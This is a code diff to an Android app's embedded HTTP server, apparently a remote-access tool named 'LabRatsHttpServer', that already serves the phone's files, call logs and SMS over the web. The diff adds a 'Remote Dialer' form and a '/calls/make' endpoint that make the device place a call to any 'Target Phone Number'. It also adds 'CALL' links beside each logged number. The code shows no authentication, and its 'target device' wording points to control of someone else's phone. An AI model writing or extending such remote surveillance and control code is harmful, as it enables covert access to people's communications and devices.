@@ -642,6 +642,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = serveFiles(uri, params);
                     } else if (uri.equals("/calls")) {
                         response = serveCallLogs(params);
+                    } else if (uri.equals("/calls/make")) {
+                        response = makeCall(params);
                     } else if (uri.equals("/sms")) {
                         response = serveSmsMessages(params);
                     } else if (uri.equals("/mms")) {
@@ -1109,6 +1111,15 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");
 
+        // --- REMOTE DIALER SECTION ---
+        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
+        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center;\">&#128222; Remote Dialer</h3>");
+        html.append("<form action=\"/calls/make\" method=\"get\">");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
+        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<button type=\"submit\" style=\"align-self: center;\">INITIATE CALL</button>");
+        html.append("</div></form></div>");
+
         // Check permission first
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
@@ -1168,7 +1179,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 html.append("<div style=\"overflow-x: auto;\">");
                 html.append("<table>");
                 html.append("<thead><tr>");
-                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th>");
+                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th><th>Action</th>");
                 html.append("</tr></thead><tbody>");
 
                 int count = 0;
@@ -1234,6 +1245,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
                             new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                             .append("</td>");
                     html.append("<td>").append(formatDuration(duration)).append("</td>");
+                    html.append("<td>");
+                    if (number != null && !number.equals("Unknown")) {
+                        html.append("<a href=\"/calls/make?number=").append(Uri.encode(number)).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); background: rgba(57, 255, 20, 0.05); min-width: 0; padding: 5px 10px;\">CALL</a>");
+                    }
+                    html.append("</td>");
                     html.append("</tr>");
 
                     count++;
@@ -2847,6 +2863,40 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append(HTML_FOOTER);
 
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response makeCall(Map<String, String> params) {
+        String number = params.get("number");
+        if (number == null || number.isEmpty()) return serveError("Invalid phone number");
+        
+        try {
+            logActivity("COMMS_DISPATCH: Initiating remote call to " + number);
+            
+            // Check for permission first
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (context.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                    return serveError("CALL_PHONE permission not granted on device");
+                }
+            }
+
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:" + Uri.encode(number)));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+
+            String html = HTML_HEADER + 
+                "<div class=\"card\"><div class=\"empty-state\">" +
+                "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div>" +
+                "<h2>Call Initiated</h2>" +
+                "<p>Uplink successful. Connection established to: " + escapeHtml(number) + "</p>" +
+                "<p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">The target device is now dialing...</p>" +
+                "<a href=\"/calls\" class=\"btn\" style=\"margin-top:30px;\">Back to Call Logs</a>" +
+                "</div></div>" + HTML_FOOTER;
+                
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        } catch (Exception e) {
+            return serveError("Failed to initiate call: " + e.getMessage());
+        }
     }
 
     private Response serveSmsMessages(Map<String, String> params) {
